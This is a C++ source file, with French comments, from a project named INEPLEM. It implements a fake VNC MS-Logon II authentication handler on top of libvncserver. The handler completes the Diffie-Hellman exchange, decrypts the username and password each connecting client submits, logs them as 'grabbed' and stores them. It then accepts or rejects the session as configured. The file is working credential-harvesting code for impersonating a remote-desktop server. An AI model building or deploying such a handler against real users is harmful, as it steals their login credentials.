// Copyright: 2019 redoste
/*
*	This file is part of INEPLEM.
*
*	INEPLEM is free software: you can redistribute it and/or modify
*	it under the terms of the GNU General Public License as published by
*	the Free Software Foundation, either version 3 of the License, or
*	(at your option) any later version.
*
*	INEPLEM is distributed in the hope that it will be useful,
*	but WITHOUT ANY WARRANTY; without even the implied warranty of
*	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*	GNU General Public License for more details.
*
*	You should have received a copy of the GNU General Public License
*	along with INEPLEM.  If not, see <https://www.gnu.org/licenses/>.
*/
#include <iostream>
#include <cstdint>
#include <rfb/rfb.h>

#include "dh.h"
extern "C"{
	#include "d3des.h"
}
#include "msAuth.h"
#include "serviceCore.h"

// msAuthServiceCorePtr: Pointeur vers le ServiceCore utilisé par msAuthIIHandler pour connaitre la AuthResponse et pouvoir stocker les creds
ServiceCore *msAuthServiceCorePtr = NULL;

/* vncDecryptBytes: Dechifre les donnée à l'aide de l'algorithme du vnc, dérivé de DES
 * unsigned char *output: pointeur vers la sortie
 * uint16_t length: taille de la sortie
 * unsigned char *key: pointeur vers la clé
 * Cette fonction est dérivée de celle d'italc (https://github.com/iTALC/italc/blob/italc3/ica/src/ItalcVncServer.cpp#L131)
 */
void vncDecryptBytes(unsigned char *output, uint16_t length, unsigned char *key){
	uint16_t i, j;
	deskey(key, DE1);
	for (i = length - 8; i > 0; i -= 8) {
		des(output + i, output + i);
		for (j = 0; j < 8; j++){
			output[i + j] ^= output[i + j - 8];
		}
	}
	des(output, output);
	for (i = 0; i < 8; i++){
		output[i] ^= key[i];
	}
}

/* msAuthIIHandler: Déchiffre les identifiants envoyé par le client au format msAuthII
 * rfbClientRec *client: pointeur vers le client
 */
void msAuthIIHandler(rfbClientRec *client){
	std::cout << "[msAuthIIHandler] New client choose MSAUTHII" << std::endl;
	DH dh;
	char gen[8], mod[8], pub[8], resp[8];
	char username[256], password[64];
	unsigned char key[8];

	// Diffe-Hellman Key Exchange
	dh.createKeys();
	int64ToBytes(dh.getValue(DH_GEN), gen);
	int64ToBytes(dh.getValue(DH_MOD), mod);
	int64ToBytes(dh.createInterKey(), pub);

	rfbWriteExact(client, gen, sizeof(gen));
	rfbWriteExact(client, mod, sizeof(mod));
	rfbWriteExact(client, pub, sizeof(pub));

	rfbReadExact(client, resp, sizeof(resp));
	rfbReadExact(client, username, sizeof(username));
	rfbReadExact(client, password, sizeof(password));

	int64ToBytes(dh.createEncryptionKey(bytesToInt64(resp)), (char*) key);
	vncDecryptBytes((unsigned char*) username, sizeof(username), key);
	username[255] = '\0';
	vncDecryptBytes((unsigned char*) password, sizeof(password), key);
	password[53] = '\0';

	std::cout << "[msAuthIIHandler] New auth grabbed " << username << ":" << password << std::endl;
	msAuthServiceCorePtr->pushCred(username, password);

	// On accepte ou non la connection
	uint32_t authResult;
	if(std::string(client->host) == std::string("127.0.0.1")){
		// On accepte si la connection viens de 127.0.0.1 pour pouvoir vérifier le framebuffer
		authResult = VNC_ACCEPT;
	}
	else{
		authResult = msAuthServiceCorePtr->getAuthresponse();
	}
	uint32_t authResultToSend = Swap32IfLE(authResult);
	rfbWriteExact(client, (char*) &authResultToSend, 4);
	if(authResult == VNC_ACCEPT){
		client->state = rfbClientRec::RFB_INITIALISATION;
		std::cout << "[msAuthIIHandler] Auth response: ACCEPTED" << std::endl;
	}
	else{
		//rfbClientSendString(client, (char*) "Authentification failed");
		std::cout << "[msAuthIIHandler] Auth response: REJECTED" << std::endl;
		rfbCloseClient(client);
	}
}

/* msAuthIIRegisterSecurity: Enregistre le securityHandler pour msAuthII au près de la libvncserver
 * ServiceCore* service: Pointeur pour définir msAuthServiceCorePtr
 * retourne un rfbSecurityHandler*: le pointeur vers le securityHandler enregistré
 */
rfbSecurityHandler* msAuthIIRegisterSecurity(ServiceCore* service){
	// On le new car sinon il est "déalloué" à la fin de la fonction => SegFault
	rfbSecurityHandler *msAuthIISecurityHandler = new rfbSecurityHandler;
	memset(msAuthIISecurityHandler, 0, sizeof(rfbSecurityHandler));
	msAuthIISecurityHandler->type = VNC_MSAUTH;
	msAuthIISecurityHandler->handler = &msAuthIIHandler;
	rfbRegisterSecurityHandler(msAuthIISecurityHandler);

	msAuthServiceCorePtr = service;
	return msAuthIISecurityHandler;
}